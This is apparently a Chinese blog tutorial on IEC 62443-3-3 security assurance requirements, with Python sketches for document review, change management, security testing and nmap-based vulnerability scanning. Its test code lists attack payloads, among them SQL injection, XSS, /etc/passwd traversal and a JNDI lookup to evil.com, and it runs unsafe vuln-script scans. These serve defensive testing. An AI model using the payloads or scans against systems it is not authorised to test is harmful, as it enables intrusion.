---
title: "IEC62443-3-3 認證教學 (四)：安全保證需求 (SAR) 深度解析"
date: 2025-07-26
categories: [工控資安]
tags: [IEC62443]
slug: "iec62443-3-3-series-04-security-assurance-requirements"
---

## 0x00 前言

在[前一篇](/posts/iec62443-3-3-series-03-foundational-requirements/)中，我們詳細學習了基礎要求 (FR) 的實作。今天我們要探討同樣重要的安全保證需求 (Security Assurance Requirements, SAR)，這是證明系統確實達到宣告安全等級的關鍵要素。

## 0x01 SAR 概念與重要性

### 什麼是安全保證需求？

安全保證需求 (SAR) 是用來**證明和驗證**系統安全功能有效性的要求。與基礎要求 (FR) 關注「做什麼」不同，SAR 關注「如何證明有做到」。

```
FR vs SAR 的關係
├── 基礎要求 (FR)：功能性要求
│   ├── 定義系統「應該做什麼」
│   ├── 技術實作規範
│   └── 安全控制措施
└── 安全保證需求 (SAR)：保證性要求
    ├── 證明系統「確實做到了」
    ├── 評估與驗證方法
    └── 文件與測試證據
```

### SAR 的四個主要類別

| SAR 類別                | 目的                   | 主要活動             |
| ----------------------- | ---------------------- | -------------------- |
| **SAR1 - 安全文件**     | 提供完整的系統安全文件 | 文件編寫、審查、維護 |
| **SAR2 - 安全生命週期** | 確保安全開發過程       | 流程定義、追蹤、稽核 |
| **SAR3 - 安全測試**     | 驗證安全功能有效性     | 測試計畫、執行、報告 |
| **SAR4 - 脆弱性分析**   | 識別和處理系統弱點     | 弱點掃描、分析、修復 |

## 0x02 SAR1：安全文件要求

### 文件架構與層次

```
安全文件架構
├── 第一層：系統概述文件
│   ├── 系統描述文件 (SDD)
│   ├── 安全目標說明 (TSS)
│   └── 營運環境描述 (OE)
├── 第二層：安全設計文件
│   ├── 安全功能規格 (SFR)
│   ├── 安全架構設計 (SAD)
│   └── 詳細設計文件 (DDD)
├── 第三層：實作與測試文件
│   ├── 實作表示 (IR)
│   ├── 測試文件 (TD)
│   └── 脆弱性評估 (VA)
└── 第四層：指導與維護文件
    ├── 使用者指南 (UG)
    ├── 管理員指南 (AG)
    └── 安全政策文件 (SP)
```

### 系統描述文件 (SDD) 實作範例

```markdown
# 系統描述文件 (System Description Document)

## 1. 系統概述

### 1.1 系統範圍

本工業控制系統包含以下組件：

- HMI 工作站 × 2
- 工程師工作站 × 1
- 歷史資料伺服器 × 1
- 冗餘 PLC 控制器 × 2
- I/O 模組 × 24
- 工業交換器 × 4

### 1.2 系統目標安全等級

- 目標安全等級：SL2
- 評估範圍：完整控制系統
- 排除項目：企業網路連接部分

### 1.3 系統邊界定義
```

┌─────────────────────────────────────────┐
│ 企業網路 (排除範圍) │
└─────────────────┬───────────────────────┘
│ 防火牆
┌─────────────────┴───────────────────────┐
│ DMZ 區域 │
│ ┌─────────────┐ ┌─────────────────┐ │
│ │ OPC Gateway │ │ 歷史資料伺服器 │ │ ← 評估範圍
│ └─────────────┘ └─────────────────┘ │
└─────────────────┬───────────────────────┘
│ 工業防火牆
┌─────────────────┴───────────────────────┐
│ 控制網路區域 │
│ ┌─────┐ ┌─────┐ ┌─────────────┐ │
│ │ HMI │ │ EWS │ │ PLC 控制器 │ │ ← 評估範圍
│ └─────┘ └─────┘ └─────────────┘ │
└─────────────────────────────────────────┘

```

## 2. 威脅模型

### 2.1 威脅來源分析
基於目標安全等級 SL2，考慮以下威脅來源：
- 內部人員意外或惡意行為
- 外部攻擊者透過網路入侵
- 惡意軟體感染
- 社交工程攻擊

### 2.2 攻擊路徑分析
1. **網路攻擊路徑**
   - 企業網路 → DMZ → 控制網路
   - 無線網路 → 控制網路 (如存在)
   - 遠端存取 → 控制網路

2. **物理攻擊路徑**
   - 未授權現場存取
   - 設備盜竊或破壞
   - 可移動媒體感染

## 3. 安全功能需求

### 3.1 FR1 - 識別與認證
- IAC_SL2_1: 強制雙因子認證
- IAC_SL2_2: 密碼複雜度要求
- IAC_SL2_3: 帳號鎖定機制
- IAC_SL2_4: 會話超時控制

### 3.2 FR2 - 使用控制
- UAC_SL2_1: 角色型存取控制
- UAC_SL2_2: 最小權限原則
- UAC_SL2_3: 權限分離
- UAC_SL2_4: 管理權限稽核

[繼續其他 FR 的詳細要求...]
```

### 文件品質控制流程

```python
class DocumentQualityControl:
    def __init__(self):
        self.review_criteria = {
            'completeness': 0.95,
            'accuracy': 0.98,
            'consistency': 0.95,
            'traceability': 0.90
        }
        self.document_templates = {}
        self.review_history = []

    def validate_document(self, document_type, content):
        """驗證文件品質"""
        validation_results = {
            'completeness': self._check_completeness(document_type, content),
            'accuracy': self._check_accuracy(content),
            'consistency': self._check_consistency(content),
            'traceability': self._check_traceability(content)
        }

        overall_score = sum(validation_results.values()) / len(validation_results)

        return {
            'overall_score': overall_score,
            'details': validation_results,
            'passed': overall_score >= 0.9,
            'recommendations': self._generate_recommendations(validation_results)
        }

    def _check_completeness(self, doc_type, content):
        """檢查文件完整性"""
        required_sections = self._get_required_sections(doc_type)
        found_sections = self._extract_sections(content)

        completion_rate = len(found_sections & required_sections) / len(required_sections)
        return completion_rate

    def _get_required_sections(self, doc_type):
        """取得文件類型的必要章節"""
        templates = {
            'SDD': {
                'system_overview', 'system_boundary', 'threat_model',
                'security_requirements', 'architecture_design', 'component_list'
            },
            'TSS': {
                'security_functions', 'security_policies', 'security_measures',
                'threat_countermeasures', 'security_implementation'
            },
            'SAR': {
                'test_coverage', 'test_procedures', 'test_results',
                'vulnerability_analysis', 'penetration_testing'
            }
        }
        return templates.get(doc_type, set())

    def generate_document_metrics(self, documents):
        """產生文件指標報告"""
        metrics = {
            'total_documents': len(documents),
            'completed_documents': 0,
            'review_pending': 0,
            'revision_required': 0,
            'approved_documents': 0
        }

        for doc in documents:
            if doc['status'] == 'completed':
                metrics['completed_documents'] += 1
            elif doc['status'] == 'review_pending':
                metrics['review_pending'] += 1
            elif doc['status'] == 'revision_required':
                metrics['revision_required'] += 1
            elif doc['status'] == 'approved':
                metrics['approved_documents'] += 1

        completion_rate = metrics['approved_documents'] / metrics['total_documents']

        return {
            'metrics': metrics,
            'completion_rate': completion_rate,
            'readiness_assessment': 'READY' if completion_rate >= 0.95 else 'NOT_READY'
        }

# 使用範例
doc_qc = DocumentQualityControl()

# 模擬文件集合
documents = [
    {'name': 'SDD', 'status': 'approved'},
    {'name': 'TSS', 'status': 'approved'},
    {'name': 'SAR', 'status': 'review_pending'},
    {'name': 'Test_Plan', 'status': 'completed'},
    {'name': 'VA_Report', 'status': 'revision_required'}
]

metrics_report = doc_qc.generate_document_metrics(documents)
print(f"文件完成率: {metrics_report['completion_rate']:.1%}")
print(f"認證準備狀態: {metrics_report['readiness_assessment']}")
```

## 0x03 SAR2：安全生命週期要求

### 安全開發生命週期 (SDLC) 整合

```
安全開發生命週期各階段
├── 規劃階段
│   ├── 安全需求分析
│   ├── 威脅建模
│   └── 安全架構設計
├── 開發階段
│   ├── 安全編碼標準
│   ├── 程式碼安全審查
│   └── 靜態分析工具
├── 測試階段
│   ├── 安全功能測試
│   ├── 滲透測試
│   └── 脆弱性掃描
├── 部署階段
│   ├── 安全配置驗證
│   ├── 安全基線建立
│   └── 安全監控啟動
└── 維護階段
    ├── 安全更新管理
    ├── 持續監控
    └── 定期安全評估
```

### 變更管理流程實作

```python
from enum import Enum
from datetime import datetime
import json

class ChangeType(Enum):
    EMERGENCY = "emergency"
    STANDARD = "standard"
    NORMAL = "normal"

class ChangeStatus(Enum):
    SUBMITTED = "submitted"
    UNDER_REVIEW = "under_review"
    APPROVED = "approved"
    REJECTED = "rejected"
    IMPLEMENTED = "implemented"
    VERIFIED = "verified"

class SecurityChangeManagement:
    def __init__(self):
        self.change_requests = {}
        self.approval_matrix = self._setup_approval_matrix()
        self.security_impact_levels = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']

    def _setup_approval_matrix(self):
        """設定核准矩陣"""
        return {
            ChangeType.EMERGENCY: {
                'approvers': ['security_manager', 'operations_manager'],
                'min_approvals': 1,
                'max_implementation_time': 24  # 小時
            },
            ChangeType.STANDARD: {
                'approvers': ['security_manager', 'system_architect', 'operations_manager'],
                'min_approvals': 2,
                'max_implementation_time': 168  # 一週
            },
            ChangeType.NORMAL: {
                'approvers': ['security_manager', 'system_architect', 'operations_manager', 'change_board'],
                'min_approvals': 3,
                'max_implementation_time': 720  # 一個月
            }
        }

    def submit_change_request(self, requestor, change_type, description,
                            security_impact, affected_systems):
        """提交變更請求"""
        change_id = f"CHG-{datetime.now().strftime('%Y%m%d')}-{len(self.change_requests) + 1:03d}"

        change_request = {
            'id': change_id,
            'requestor': requestor,
            'type': change_type,
            'description': description,
            'security_impact': security_impact,
            'affected_systems': affected_systems,
            'status': ChangeStatus.SUBMITTED,
            'submitted_time': datetime.now().isoformat(),
            'approvals': [],
            'security_assessment': None,
            'implementation_plan': None,
            'rollback_plan': None
        }

        self.change_requests[change_id] = change_request

        # 自動觸發安全影響評估
        self._assess_security_impact(change_id)

        return change_id

    def _assess_security_impact(self, change_id):
        """評估安全影響"""
        change = self.change_requests[change_id]

        # 基於多個因素計算安全影響分數
        impact_factors = {
            'system_criticality': self._get_system_criticality(change['affected_systems']),
            'change_scope': self._assess_change_scope(change['description']),
            'security_controls_affected': self._check_security_controls_impact(change),
            'external_connectivity': self._check_external_connectivity_impact(change)
        }

        # 計算總體影響分數 (0-100)
        total_score = sum(impact_factors.values()) / len(impact_factors)

        # 確定影響等級
        if total_score >= 80:
            impact_level = 'CRITICAL'
        elif total_score >= 60:
            impact_level = 'HIGH'
        elif total_score >= 40:
            impact_level = 'MEDIUM'
        else:
            impact_level = 'LOW'

        security_assessment = {
            'impact_level': impact_level,
            'impact_score': total_score,
            'impact_factors': impact_factors,
            'additional_requirements': self._get_additional_requirements(impact_level),
            'assessment_time': datetime.now().isoformat()
        }

        self.change_requests[change_id]['security_assessment'] = security_assessment

        return security_assessment

    def _get_additional_requirements(self, impact_level):
        """根據影響等級取得額外要求"""
        requirements = {
            'LOW': ['basic_testing', 'peer_review'],
            'MEDIUM': ['security_testing', 'configuration_backup', 'rollback_plan'],
            'HIGH': ['penetration_testing', 'extended_monitoring', 'staged_deployment'],
            'CRITICAL': ['red_team_assessment', 'business_continuity_plan', 'executive_approval']
        }
        return requirements.get(impact_level, [])

    def approve_change(self, change_id, approver, comments=""):
        """核准變更"""
        if change_id not in self.change_requests:
            return False, "變更請求不存在"

        change = self.change_requests[change_id]

        # 檢查核准者權限
        required_approvers = self.approval_matrix[change['type']]['approvers']
        if approver not in required_approvers:
            return False, "核准者無權限"

        # 記錄核准
        approval = {
            'approver': approver,
            'timestamp': datetime.now().isoformat(),
            'comments': comments
        }
        change['approvals'].append(approval)

        # 檢查是否達到最小核准數
        min_approvals = self.approval_matrix[change['type']]['min_approvals']
        if len(change['approvals']) >= min_approvals:
            change['status'] = ChangeStatus.APPROVED
            self._generate_implementation_checklist(change_id)

        return True, "核准成功"

    def _generate_implementation_checklist(self, change_id):
        """產生實作檢核清單"""
        change = self.change_requests[change_id]
        impact_level = change['security_assessment']['impact_level']

        base_checklist = [
            "備份現有配置",
            "準備回滾計畫",
            "通知相關人員",
            "執行變更",
            "驗證變更結果",
            "更新文件"
        ]

        # 根據影響等級添加額外檢查項目
        if impact_level in ['HIGH', 'CRITICAL']:
            base_checklist.extend([
                "執行安全功能測試",
                "監控系統行為",
                "進行安全掃描"
            ])

        if impact_level == 'CRITICAL':
            base_checklist.extend([
                "執行滲透測試",
                "業務連續性驗證"
            ])

        change['implementation_checklist'] = base_checklist
        return base_checklist

# 使用範例
change_mgmt = SecurityChangeManagement()

# 提交變更請求
change_id = change_mgmt.submit_change_request(
    requestor="john.doe",
    change_type=ChangeType.STANDARD,
    description="更新 PLC 韌體版本至 v2.1.3",
    security_impact="韌體更新可能影響通訊協議安全性",
    affected_systems=["PLC_001", "PLC_002", "HMI_Station_01"]
)

print(f"變更請求已提交: {change_id}")

# 核准變更
success, message = change_mgmt.approve_change(
    change_id,
    "security_manager",
    "安全影響評估通過，可以執行"
)

print(f"核准結果: {message}")
```

## 0x04 SAR3：安全測試要求

### 測試策略與覆蓋率

```
安全測試金字塔
├── 單元測試 (Unit Tests)
│   ├── 輸入驗證測試
│   ├── 認證功能測試
│   └── 加密函數測試
├── 整合測試 (Integration Tests)
│   ├── 模組間通訊測試
│   ├── 權限檢查測試
│   └── 資料流測試
├── 系統測試 (System Tests)
│   ├── 端到端安全流程測試
│   ├── 負載測試下的安全性
│   └── 故障恢復測試
└── 驗收測試 (Acceptance Tests)
    ├── 業務場景安全測試
    ├── 使用者體驗測試
    └── 合規性驗證測試
```

### 自動化安全測試框架

```python
import subprocess
import json
import time
from typing import Dict, List
import requests

class SecurityTestFramework:
    def __init__(self, target_system):
        self.target_system = target_system
        self.test_results = {}
        self.test_suite = {
            'authentication': self._authentication_tests,
            'authorization': self._authorization_tests,
            'input_validation': self._input_validation_tests,
            'session_management': self._session_management_tests,
            'encryption': self._encryption_tests,
            'network_security': self._network_security_tests
        }

    def run_full_security_test_suite(self):
        """執行完整安全測試套件"""
        print("開始執行安全測試套件...")
        overall_results = {
            'start_time': time.time(),
            'test_results': {},
            'summary': {}
        }

        for test_category, test_function in self.test_suite.items():
            print(f"執行 {test_category} 測試...")
            try:
                test_result = test_function()
                overall_results['test_results'][test_category] = test_result
                print(f"✓ {test_category} 測試完成")
            except Exception as e:
                print(f"✗ {test_category} 測試失敗: {e}")
                overall_results['test_results'][test_category] = {
                    'status': 'FAILED',
                    'error': str(e)
                }

        overall_results['end_time'] = time.time()
        overall_results['summary'] = self._generate_test_summary(overall_results['test_results'])

        return overall_results

    def _authentication_tests(self):
        """認證功能測試"""
        tests = {
            'password_complexity': self._test_password_complexity(),
            'account_lockout': self._test_account_lockout(),
            'session_timeout': self._test_session_timeout(),
            'mfa_bypass': self._test_mfa_bypass()
        }

        passed = sum(1 for result in tests.values() if result['status'] == 'PASSED')
        total = len(tests)

        return {
            'category': 'authentication',
            'tests': tests,
            'passed': passed,
            'total': total,
            'success_rate': passed / total
        }

    def _test_password_complexity(self):
        """密碼複雜度測試"""
        weak_passwords = [
            'password', '123456', 'admin', 'user',
            'password123', 'qwerty', '111111'
        ]

        failed_attempts = 0
        for password in weak_passwords:
            try:
                # 模擬登入嘗試
                response = self._attempt_login('testuser', password)
                if response.get('success'):
                    failed_attempts += 1
            except Exception:
                pass  # 預期的失敗

        return {
            'status': 'PASSED' if failed_attempts == 0 else 'FAILED',
            'details': f'弱密碼測試: {failed_attempts}/{len(weak_passwords)} 失敗',
            'weak_passwords_accepted': failed_attempts
        }

    def _test_account_lockout(self):
        """帳號鎖定測試"""
        test_username = 'lockout_test_user'
        max_attempts = 3

        # 進行超過閾值的失敗登入嘗試
        for i in range(max_attempts + 2):
            try:
                self._attempt_login(test_username, 'wrong_password')
            except Exception:
                pass

        # 嘗試用正確密碼登入
        try:
            response = self._attempt_login(test_username, 'correct_password')
            account_locked = not response.get('success')
        except Exception:
            account_locked = True

        return {
            'status': 'PASSED' if account_locked else 'FAILED',
            'details': f'帳號鎖定機制: {"有效" if account_locked else "無效"}'
        }

    def _authorization_tests(self):
        """授權控制測試"""
        tests = {
            'privilege_escalation': self._test_privilege_escalation(),
            'horizontal_access': self._test_horizontal_access_control(),
            'resource_access': self._test_resource_access_control()
        }

        passed = sum(1 for result in tests.values() if result['status'] == 'PASSED')
        total = len(tests)

        return {
            'category': 'authorization',
            'tests': tests,
            'passed': passed,
            'total': total,
            'success_rate': passed / total
        }

    def _input_validation_tests(self):
        """輸入驗證測試"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]

        vulnerable_endpoints = 0
        total_endpoints = len(injection_payloads)

        for payload in injection_payloads:
            try:
                # 測試各種注入攻擊
                if self._test_injection_payload(payload):
                    vulnerable_endpoints += 1
            except Exception:
                pass

        return {
            'category': 'input_validation',
            'status': 'PASSED' if vulnerable_endpoints == 0 else 'FAILED',
            'vulnerable_endpoints': vulnerable_endpoints,
            'total_tested': total_endpoints
        }

    def _network_security_tests(self):
        """網路安全測試"""
        tests = {
            'port_scan': self._test_unnecessary_ports(),
            'ssl_configuration': self._test_ssl_configuration(),
            'network_segmentation': self._test_network_segmentation()
        }

        passed = sum(1 for result in tests.values() if result['status'] == 'PASSED')
        total = len(tests)

        return {
            'category': 'network_security',
            'tests': tests,
            'passed': passed,
            'total': total,
            'success_rate': passed / total
        }

    def _test_ssl_configuration(self):
        """SSL/TLS 配置測試"""
        try:
            # 使用 testssl.sh 或類似工具
            result = subprocess.run([
                'testssl.sh',
                '--quiet',
                '--jsonfile', '/tmp/ssl_test.json',
                self.target_system
            ], capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                with open('/tmp/ssl_test.json', 'r') as f:
                    ssl_results = json.load(f)

                # 分析結果
                critical_issues = [
                    issue for issue in ssl_results
                    if issue.get('severity') == 'CRITICAL'
                ]

                return {
                    'status': 'PASSED' if len(critical_issues) == 0 else 'FAILED',
                    'critical_issues': len(critical_issues),
                    'details': critical_issues[:3]  # 只顯示前3個
                }
            else:
                return {
                    'status': 'ERROR',
                    'details': 'SSL測試工具執行失敗'
                }

        except Exception as e:
            return {
                'status': 'ERROR',
                'details': f'SSL測試異常: {e}'
            }

    def _generate_test_summary(self, test_results):
        """產生測試摘要"""
        total_categories = len(test_results)
        passed_categories = 0
        total_tests = 0
        passed_tests = 0

        for category, result in test_results.items():
            if result.get('status') != 'FAILED':
                passed_categories += 1

            if 'total' in result:
                total_tests += result['total']
                passed_tests += result['passed']

        return {
            'category_success_rate': passed_categories / total_categories,
            'test_success_rate': passed_tests / total_tests if total_tests > 0 else 0,
            'total_categories': total_categories,
            'passed_categories': passed_categories,
            'total_tests': total_tests,
            'passed_tests': passed_tests,
            'overall_status': 'PASSED' if passed_categories == total_categories else 'FAILED'
        }

    def generate_test_report(self, test_results):
        """產生測試報告"""
        report = f"""
# 安全測試報告

## 測試概述
- 測試目標: {self.target_system}
- 測試時間: {time.strftime('%Y-%m-%d %H:%M:%S')}
- 整體狀態: {test_results['summary']['overall_status']}

## 測試結果摘要
- 測試類別通過率: {test_results['summary']['category_success_rate']:.1%}
- 個別測試通過率: {test_results['summary']['test_success_rate']:.1%}
- 通過類別: {test_results['summary']['passed_categories']}/{test_results['summary']['total_categories']}
- 通過測試: {test_results['summary']['passed_tests']}/{test_results['summary']['total_tests']}

## 詳細結果
"""

        for category, result in test_results['test_results'].items():
            status_icon = "✓" if result.get('status') != 'FAILED' else "✗"
            report += f"\n### {status_icon} {category.upper()}\n"

            if 'tests' in result:
                for test_name, test_result in result['tests'].items():
                    test_icon = "✓" if test_result['status'] == 'PASSED' else "✗"
                    report += f"- {test_icon} {test_name}: {test_result['details']}\n"

        return report

# 使用範例
test_framework = SecurityTestFramework('https://ics-system.company.com')

# 執行完整測試套件
results = test_framework.run_full_security_test_suite()

# 產生報告
report = test_framework.generate_test_report(results)
print(report)

# 儲存結果
with open('security_test_results.json', 'w') as f:
    json.dump(results, f, indent=2)
```

## 0x05 SAR4：脆弱性分析要求

### 脆弱性評估流程

```python
import nmap
import requests
from urllib.parse import urljoin
import json
import subprocess
from datetime import datetime

class VulnerabilityAssessment:
    def __init__(self, target_systems, security_level='SL2'):
        self.target_systems = target_systems
        self.security_level = security_level
        self.vulnerability_db = {}
        self.assessment_results = {}

        # 根據安全等級設定評估深度
        self.assessment_depth = {
            'SL1': 'basic',
            'SL2': 'standard',
            'SL3': 'comprehensive',
            'SL4': 'exhaustive'
        }.get(security_level, 'standard')

    def run_vulnerability_assessment(self):
        """執行脆弱性評估"""
        print(f"開始執行 {self.security_level} 等級脆弱性評估...")

        assessment_plan = self._create_assessment_plan()

        for phase in assessment_plan:
            print(f"執行 {phase['name']} 階段...")
            try:
                phase_results = phase['function']()
                self.assessment_results[phase['name']] = phase_results
                print(f"✓ {phase['name']} 完成")
            except Exception as e:
                print(f"✗ {phase['name']} 失敗: {e}")
                self.assessment_results[phase['name']] = {
                    'status': 'FAILED',
                    'error': str(e)
                }

        # 產生綜合報告
        comprehensive_report = self._generate_comprehensive_report()
        return comprehensive_report

    def _create_assessment_plan(self):
        """建立評估計畫"""
        base_plan = [
            {'name': 'network_discovery', 'function': self._network_discovery},
            {'name': 'port_scanning', 'function': self._port_scanning},
            {'name': 'service_enumeration', 'function': self._service_enumeration},
            {'name': 'vulnerability_scanning', 'function': self._vulnerability_scanning}
        ]

        if self.assessment_depth in ['comprehensive', 'exhaustive']:
            base_plan.extend([
                {'name': 'web_application_testing', 'function': self._web_app_testing},
                {'name': 'wireless_security_testing', 'function': self._wireless_testing}
            ])

        if self.assessment_depth == 'exhaustive':
            base_plan.extend([
                {'name': 'social_engineering_assessment', 'function': self._social_engineering_test},
                {'name': 'physical_security_assessment', 'function': self._physical_security_test}
            ])

        return base_plan

    def _network_discovery(self):
        """網路探索"""
        discovery_results = {
            'discovered_hosts': [],
            'network_topology': {},
            'active_services': {}
        }

        for target in self.target_systems:
            try:
                nm = nmap.PortScanner()
                # 基本主機探索
                nm.scan(hosts=target, arguments='-sn')

                for host in nm.all_hosts():
                    if nm[host].state() == 'up':
                        host_info = {
                            'ip': host,
                            'hostname': nm[host].hostname(),
                            'state': nm[host].state(),
                            'last_seen': datetime.now().isoformat()
                        }
                        discovery_results['discovered_hosts'].append(host_info)

            except Exception as e:
                print(f"網路探索失敗 {target}: {e}")

        return discovery_results

    def _port_scanning(self):
        """埠掃描"""
        scan_results = {}

        for target in self.target_systems:
            try:
                nm = nmap.PortScanner()

                # 根據評估深度選擇掃描參數
                if self.assessment_depth == 'basic':
                    scan_args = '-sS -T4 --top-ports 100'
                elif self.assessment_depth == 'standard':
                    scan_args = '-sS -sV -T4 --top-ports 1000'
                elif self.assessment_depth == 'comprehensive':
                    scan_args = '-sS -sV -sC -T4 -p-'
                else:  # exhaustive
                    scan_args = '-sS -sV -sC -A -T4 -p-'

                nm.scan(hosts=target, arguments=scan_args)

                target_results = {}
                for host in nm.all_hosts():
                    if nm[host].state() == 'up':
                        host_ports = []
                        for protocol in nm[host].all_protocols():
                            ports = nm[host][protocol].keys()
                            for port in ports:
                                port_info = {
                                    'port': port,
                                    'protocol': protocol,
                                    'state': nm[host][protocol][port]['state'],
                                    'service': nm[host][protocol][port].get('name', ''),
                                    'version': nm[host][protocol][port].get('version', ''),
                                    'product': nm[host][protocol][port].get('product', '')
                                }
                                host_ports.append(port_info)

                        target_results[host] = {
                            'hostname': nm[host].hostname(),
                            'state': nm[host].state(),
                            'ports': host_ports
                        }

                scan_results[target] = target_results

            except Exception as e:
                print(f"埠掃描失敗 {target}: {e}")
                scan_results[target] = {'error': str(e)}

        return scan_results

    def _vulnerability_scanning(self):
        """脆弱性掃描"""
        vuln_results = {}

        for target in self.target_systems:
            try:
                # 使用 Nmap 腳本引擎進行脆弱性掃描
                nm = nmap.PortScanner()
                nm.scan(
                    hosts=target,
                    arguments='--script vuln --script-args=unsafe=1'
                )

                target_vulns = []
                for host in nm.all_hosts():
                    if 'hostscript' in nm[host]:
                        for script in nm[host]['hostscript']:
                            if 'vuln' in script['id']:
                                vuln = {
                                    'script_id': script['id'],
                                    'output': script['output'],
                                    'severity': self._assess_vulnerability_severity(script)
                                }
                                target_vulns.append(vuln)

                vuln_results[target] = target_vulns

            except Exception as e:
                print(f"脆弱性掃描失敗 {target}: {e}")
                vuln_results[target] = {'error': str(e)}

        return vuln_results

    def _assess_vulnerability_severity(self, script_result):
        """評估脆弱性嚴重程度"""
        output = script_result['output'].lower()

        # 基於關鍵字的嚴重程度評估
        if any(keyword in output for keyword in ['critical', 'remote code execution', 'authentication bypass']):
            return 'CRITICAL'
        elif any(keyword in output for keyword in ['high', 'privilege escalation', 'sql injection']):
            return 'HIGH'
        elif any(keyword in output for keyword in ['medium', 'information disclosure']):
            return 'MEDIUM'
        else:
            return 'LOW'

    def _generate_comprehensive_report(self):
        """產生綜合評估報告"""
        report = {
            'assessment_metadata': {
                'target_systems': self.target_systems,
                'security_level': self.security_level,
                'assessment_depth': self.assessment_depth,
                'assessment_date': datetime.now().isoformat()
            },
            'executive_summary': self._generate_executive_summary(),
            'detailed_findings': self.assessment_results,
            'risk_matrix': self._generate_risk_matrix(),
            'remediation_plan': self._generate_remediation_plan()
        }

        return report

    def _generate_executive_summary(self):
        """產生執行摘要"""
        total_vulnerabilities = 0
        critical_vulns = 0
        high_vulns = 0

        if 'vulnerability_scanning' in self.assessment_results:
            for target, vulns in self.assessment_results['vulnerability_scanning'].items():
                if isinstance(vulns, list):
                    total_vulnerabilities += len(vulns)
                    critical_vulns += len([v for v in vulns if v.get('severity') == 'CRITICAL'])
                    high_vulns += len([v for v in vulns if v.get('severity') == 'HIGH'])

        risk_level = 'LOW'
        if critical_vulns > 0:
            risk_level = 'CRITICAL'
        elif high_vulns > 5:
            risk_level = 'HIGH'
        elif high_vulns > 0:
            risk_level = 'MEDIUM'

        return {
            'overall_risk_level': risk_level,
            'total_vulnerabilities': total_vulnerabilities,
            'critical_vulnerabilities': critical_vulns,
            'high_vulnerabilities': high_vulns,
            'assessment_scope': len(self.target_systems),
            'recommendations': self._get_top_recommendations(risk_level)
        }

    def _get_top_recommendations(self, risk_level):
        """取得主要建議"""
        recommendations = {
            'CRITICAL': [
                '立即修補所有關鍵脆弱性',
                '暫時隔離高風險系統',
                '啟動事件回應計畫',
                '進行緊急安全評估'
            ],
            'HIGH': [
                '在72小時內修補高風險脆弱性',
                '加強監控和記錄',
                '檢視存取控制政策',
                '更新安全基線'
            ],
            'MEDIUM': [
                '制定脆弱性修補計畫',
                '進行安全意識培訓',
                '更新安全政策',
                '定期安全掃描'
            ],
            'LOW': [
                '維持定期安全評估',
                '持續安全監控',
                '保持安全最佳實務',
                '更新威脅情報'
            ]
        }

        return recommendations.get(risk_level, recommendations['LOW'])

# 使用範例
va = VulnerabilityAssessment(
    target_systems=['192.168.1.0/24', '10.1.1.0/24'],
    security_level='SL3'
)

# 執行脆弱性評估
assessment_report = va.run_vulnerability_assessment()

# 儲存報告
with open('vulnerability_assessment_report.json', 'w') as f:
    json.dump(assessment_report, f, indent=2)

print("脆弱性評估完成，報告已儲存")
print(f"整體風險等級: {assessment_report['executive_summary']['overall_risk_level']}")
print(f"發現脆弱性總數: {assessment_report['executive_summary']['total_vulnerabilities']}")
```

## 0x06 SAR 實作成熟度評估

### 成熟度等級定義

```python
class SARMaturityAssessment:
    def __init__(self):
        self.maturity_levels = {
            1: "初始級 - 缺乏正式流程",
            2: "可重複級 - 基本流程建立",
            3: "已定義級 - 標準化流程",
            4: "量化管理級 - 指標化管理",
            5: "最佳化級 - 持續改善"
        }

        self.assessment_criteria = {
            'documentation': {
                'weight': 0.25,
                'indicators': [
                    '文件完整性',
                    '文件更新頻率',
                    '文件品質',
                    '版本控制'
                ]
            },
            'lifecycle_management': {
                'weight': 0.25,
                'indicators': [
                    '變更管理流程',
                    '生命週期追蹤',
                    '流程自動化',
                    '稽核軌跡'
                ]
            },
            'testing': {
                'weight': 0.30,
                'indicators': [
                    '測試覆蓋率',
                    '自動化程度',
                    '測試頻率',
                    '結果追蹤'
                ]
            },
            'vulnerability_management': {
                'weight': 0.20,
                'indicators': [
                    '掃描頻率',
                    '修復時效',
                    '風險評估',
                    '持續監控'
                ]
            }
        }

    def assess_sar_maturity(self, organization_data):
        """評估 SAR 成熟度"""
        domain_scores = {}

        for domain, criteria in self.assessment_criteria.items():
            domain_score = self._assess_domain(domain, organization_data.get(domain, {}))
            domain_scores[domain] = domain_score

        # 計算加權總分
        weighted_score = sum(
            score * self.assessment_criteria[domain]['weight']
            for domain, score in domain_scores.items()
        )

        maturity_level = min(5, max(1, int(weighted_score)))

        return {
            'overall_maturity_level': maturity_level,
            'maturity_description': self.maturity_levels[maturity_level],
            'domain_scores': domain_scores,
            'weighted_score': weighted_score,
            'improvement_recommendations': self._generate_improvement_recommendations(domain_scores)
        }

    def _assess_domain(self, domain, domain_data):
        """評估特定領域成熟度"""
        # 這裡應該根據實際的組織數據進行評估
        # 為了示例，我們使用模擬評估邏輯

        indicator_scores = []
        indicators = self.assessment_criteria[domain]['indicators']

        for indicator in indicators:
            # 模擬評估分數 (1-5)
            score = domain_data.get(indicator, 2)  # 預設為2分
            indicator_scores.append(score)

        return sum(indicator_scores) / len(indicator_scores)

    def _generate_improvement_recommendations(self, domain_scores):
        """產生改善建議"""
        recommendations = []

        for domain, score in domain_scores.items():
            if score < 3:
                if domain == 'documentation':
                    recommendations.append("建立標準化文件模板和審查流程")
                elif domain == 'lifecycle_management':
                    recommendations.append("實作正式的變更管理和生命週期追蹤系統")
                elif domain == 'testing':
                    recommendations.append("增加測試自動化和覆蓋率監控")
                elif domain == 'vulnerability_management':
                    recommendations.append("建立定期脆弱性掃描和風險評估流程")

        return recommendations

# 使用範例
maturity_assessor = SARMaturityAssessment()

# 模擬組織數據
org_data = {
    'documentation': {
        '文件完整性': 3,
        '文件更新頻率': 2,
        '文件品質': 3,
        '版本控制': 4
    },
    'lifecycle_management': {
        '變更管理流程': 2,
        '生命週期追蹤': 2,
        '流程自動化': 1,
        '稽核軌跡': 3
    },
    'testing': {
        '測試覆蓋率': 3,
        '自動化程度': 2,
        '測試頻率': 3,
        '結果追蹤': 2
    },
    'vulnerability_management': {
        '掃描頻率': 3,
        '修復時效': 2,
        '風險評估': 3,
        '持續監控': 2
    }
}

maturity_result = maturity_assessor.assess_sar_maturity(org_data)

print(f"SAR 成熟度等級: {maturity_result['overall_maturity_level']}")
print(f"描述: {maturity_result['maturity_description']}")
print("\n改善建議:")
for rec in maturity_result['improvement_recommendations']:
    print(f"- {rec}")
```

## 0x07 下一步預告

